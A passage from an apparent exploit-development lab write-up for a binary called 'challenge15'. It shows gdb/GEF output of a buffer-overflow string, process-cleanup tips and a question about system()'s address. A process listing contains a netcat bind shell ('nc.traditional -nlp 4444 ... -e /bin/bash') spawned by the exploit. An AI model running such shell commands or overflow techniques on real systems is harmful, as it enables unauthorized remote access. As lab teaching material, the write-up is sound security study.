+[#0] Id 1, Name: "challenge15", stopped 0x40130e in handleData (), reason: BREAKPOINT
+─────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  i r rdi
+rdi            0x7ffef7b3ea70      0x7ffef7b3ea70
+gef➤  x/1s $rdi
+0x7ffef7b3ea70: "XXXX", 'A' <repeats 276 times>, "BBBB"
+gef➤
+
+```
+
+`RDI` points to a string which is our username, and shellcode. 
+
+How convenient!
+
+## Tipps 
+
+You may need to clean up after your previous exploit attempts. 
+
+```
+~/challenges/challenge15$ ps axw
+    PID TTY      STAT   TIME COMMAND
+      1 ?        Ss     0:00 /sbin/init
+     60 ?        Ss     0:00 /lib/systemd/systemd-journald
+     84 ?        Ssl    0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/l
+    110 ?        Ss     0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-onl
+    112 ?        Ss     0:00 /lib/systemd/systemd-logind
+    115 pts/0    Ss+    0:00 /sbin/agetty -o -p -- \u --noclear --keep-baud console 115200,38400,9600 linux
+    124 pts/1    Ss+    0:00 bash
+   1010 ?        Rs     4:28 tmux
+   8003 pts/2    Ss     0:00 bash
+   8004 pts/2    S+     0:00 tmux a
+   8851 pts/4    Ss     0:00 -bash
+   8884 pts/5    Ss     0:00 -bash
+   9140 pts/5    S+     0:00 vi challenge15-solution.py
+   9590 pts/6    Ss     0:00 -bash
+   9597 pts/4    S+     0:00 ./challenge15
+   9710 ?        Zs     0:00 [gdb] <defunct>
+   9728 pts/4    S+     0:00 ./challenge15
+   9729 pts/4    S+     0:00 sh -c                                                           
+   9730 pts/4    S+     0:00 nc.traditional -nlp 4444 127.0.0.1 -e /bin/bash
+   9746 pts/6    R+     0:00 ps axw
+```
+
+Troublesome processes may include 9710, 9728 and 9730.
+
+May need to `pkill -9 nc.traditional`, and/or `gdb`, `challenge15`, and more. 
+
+
+## Things to think about
+
+* The address of `system()` via disassembly is `0x401070`, while from the GEF `got` command is `0x401076`. Both seem to work. Whats the correlation?
